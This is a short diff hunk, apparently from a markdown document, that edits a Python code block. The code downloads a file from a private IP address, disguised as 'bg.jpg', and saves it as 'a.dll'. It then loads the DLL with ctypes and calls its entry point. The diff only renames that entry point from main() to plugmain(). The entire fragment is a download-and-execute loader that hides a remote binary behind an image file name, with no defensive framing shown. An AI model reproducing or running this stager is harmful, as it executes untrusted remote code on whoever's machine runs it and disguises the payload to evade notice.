@@ -60,7 +60,7 @@ from ctypes import cdll
 res = requests.get("http://192.168.93.217:801/bq1iFEP2/assert/dll/x64/bg.jpg")
 with open("a.dll","wb") as f:
     f.write(res.content)
-cdll.LoadLibrary("a.dll").main()
+cdll.LoadLibrary("a.dll").plugmain()
 
 ```
 
